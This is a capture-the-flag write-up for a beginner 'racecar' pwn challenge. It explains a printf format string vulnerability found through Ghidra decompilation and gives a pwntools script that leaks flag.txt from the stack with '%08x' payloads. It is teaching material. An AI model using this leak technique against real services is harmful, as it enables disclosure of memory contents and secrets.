## Skills required: basic pwn knowledge

This challenge serves as a nice introduction to binary exploitation and should be beginner-friendly enough. ~The next easiest pwn topic can give substantially harder challenges~.

<details>
  <summary>Hint 1:</summary>
  How can you reverse the program to understand it more? What are some tools that can be used?
</details>

<details>
  <summary>Hint 2:</summary>
  Only basic C knowledge is needed for this type of exploit.
</details>

<details>
  <summary><b>Solution:</b></summary>
  <br/>
  
  This 32-bit executable can be easily reversed with Ghidra. Looking at the decompiled functions will eventually lead you to:

``` c
void car_menu(void){
  int iVar1;
  int iVar2;
  uint __seed;
  int iVar3;
  size_t sVar4;
  char *__format;
  FILE *__stream;
  int in_GS_OFFSET;
  undefined *puVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  uint local_54;
  char local_3c [44];
  int local_10;
  
  local_10 = *(int *)(in_GS_OFFSET + 0x14);
  uVar6 = 0xffffffff;
  uVar7 = 0xffffffff;
  do {
    printf(&DAT_00011948);
    iVar1 = read_int(uVar6,uVar7);
    if ((iVar1 != 2) && (iVar1 != 1)) {
      printf("\n%s[-] Invalid choice!%s\n",&DAT_00011548,&DAT_00011538);
    }
  } while ((iVar1 != 2) && (iVar1 != 1));
  iVar2 = race_type();
  __seed = time((time_t *)0x0);
  srand(__seed);
  if (((iVar1 == 1) && (iVar2 == 2)) || ((iVar1 == 2 && (iVar2 == 2)))) {
    iVar2 = rand();
    iVar2 = iVar2 % 10;
    iVar3 = rand();
    iVar3 = iVar3 % 100;
  }
  else if (((iVar1 == 1) && (iVar2 == 1)) || ((iVar1 == 2 && (iVar2 == 1)))) {
    iVar2 = rand();
    iVar2 = iVar2 % 100;
    iVar3 = rand();
    iVar3 = iVar3 % 10;
  }
  else {
    iVar2 = rand();
    iVar2 = iVar2 % 100;
    iVar3 = rand();
    iVar3 = iVar3 % 100;
  }
  local_54 = 0;
  while( true ) {
    sVar4 = strlen("\n[*] Waiting for the race to finish...");
    if (sVar4 <= local_54) break;
    putchar((int)"\n[*] Waiting for the race to finish..."[local_54]);
    if ("\n[*] Waiting for the race to finish..."[local_54] == '.') {
      sleep(0);
    }
    local_54 = local_54 + 1;
  }
  if (((iVar1 == 1) && (iVar2 < iVar3)) || ((iVar1 == 2 && (iVar3 < iVar2)))) {
    printf("%s\n\n[+] You won the race!! You get 100 coins!\n",&DAT_00011540);
    coins = coins + 100;
    puVar5 = &DAT_00011538;
    printf("[+] Current coins: [%d]%s\n",coins,&DAT_00011538);
    printf("\n[!] Do you have anything to say to the press after your big victory?\n> %s",
           &DAT_000119de);
    __format = (char *)malloc(0x171);
    __stream = fopen("flag.txt","r");
    if (__stream == (FILE *)0x0) {
      printf("%s[-] Could not open flag.txt. Please contact the creator.\n",&DAT_00011548,puVar5);
                    /* WARNING: Subroutine does not return */
      exit(0x69);
    }
    fgets(local_3c,0x2c,__stream);
    read(0,__format,0x170);
    puts(
        "\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m"
        );
    printf(__format);
  }
  else if (((iVar1 == 1) && (iVar3 < iVar2)) || ((iVar1 == 2 && (iVar2 < iVar3)))) {
    printf("%s\n\n[-] You lost the race and all your coins!\n",&DAT_00011548);
    coins = 0;
    printf("[+] Current coins: [%d]%s\n",0,&DAT_00011538);
  }
  if (local_10 != *(int *)(in_GS_OFFSET + 0x14)) {
    __stack_chk_fail_local();
  }
  return;
}
```

  `flag.txt` is read in the program but never printed. Can we leak the information somehow?
  
  Upon closer inspection, this line draws our attention:
  
```c
printf(__format);
```

  The issue is, printf usually takes 2 arguments: the format string and data to be supplied (if needed). Here's an example:
  
```c
char name[99];
printf("Please enter your name: ");
scanf("%s", &name);
printf("Hello, %s", name); // this line
```
  
  Supplying unsanitized user input directly as the format string gives rise to a "[format string vulnerability](https://www.securecoding.com/blog/format-string-vulnerability/)".
  The link gives a very detailed account on the matter, but for better illustration and learning, I use pwndbg to display the stack just before the printf (*Note I have set up a fake flag in `flag.txt` and the input is `abcdefghijklmnopqrstuvwxyz`*):
  
  ![Screenshot from 2022-10-19 23-44-05](https://user-images.githubusercontent.com/114584910/196756388-7d5e0dcf-d280-47ac-91f7-bf4ae406dc20.png)

  ![Screenshot from 2022-10-19 23-47-36](https://user-images.githubusercontent.com/114584910/196756409-fd888346-a7d7-443f-b020-d88431877844.png)

  Getting to that piece of code is trivially done by code inspection, trial-and-error or common sense (use 2->2->1 as the inputs).
      
  My pwntools script to solve the challenge:
  
``` py
from pwn import *
r = process('./racecar') # remote(...)
r.sendafter(b': ', b'd')
r.sendafter(b': ', b'd')
r.sendafter(b'> ', b'2')
r.sendafter(b'> ', b'2')
r.sendafter(b'> ', b'1')
r.sendafter(b'> \x1b[0m', b'%08x'*32)
#r.interactive()
r.readuntil(b'\x1b[0m')
s = r.readall().strip()
r.close()
print(b"".join(unhex(s[k:k+8].decode('utf-8'))[::-1] for k in range(0,32*8,8)))
```

</details>
